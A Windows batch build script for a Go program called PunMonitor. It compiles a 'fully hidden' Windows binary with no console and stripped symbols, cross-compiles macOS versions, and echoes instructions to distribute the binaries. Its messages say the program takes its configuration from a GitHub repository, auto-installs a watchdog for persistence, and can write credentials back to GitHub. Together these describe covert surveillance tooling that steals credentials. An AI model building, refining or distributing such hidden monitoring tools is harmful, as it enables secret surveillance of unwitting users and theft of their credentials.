@echo off
set REPO=puniteswra-spec/PU

echo Building PunMonitor.exe (fully hidden — auto-configures from GitHub)...
go build -ldflags="-X main.defaultGitHubRepo=%REPO% -H windowsgui -s -w" -o PunMonitor.exe
if %errorlevel% neq 0 (
    echo Build failed!
    exit /b 1
)
echo Done.
echo.
echo Cross-compiling for macOS (ARM64, AMD64)...
set GOOS=darwin
set GOARCH=arm64
go build -ldflags="-X main.defaultGitHubRepo=%REPO% -s -w" -o monitor-darwin-arm64
set GOARCH=amd64
go build -ldflags="-X main.defaultGitHubRepo=%REPO% -s -w" -o monitor-darwin-amd64
set GOOS=
set GOARCH=
echo.
echo Binaries ready. Distribute any of:
echo   PunMonitor.exe          Windows (fully hidden)
echo   monitor-darwin-arm64    Mac Apple Silicon
echo   monitor-darwin-amd64    Mac Intel
echo.
echo First run pulls all config from GitHub and auto-installs watchdog.
echo Subsequent runs use cached settings — zero manual steps.
echo.
echo To enable GitHub write-back (credential backup), set token in dashboard Settings.
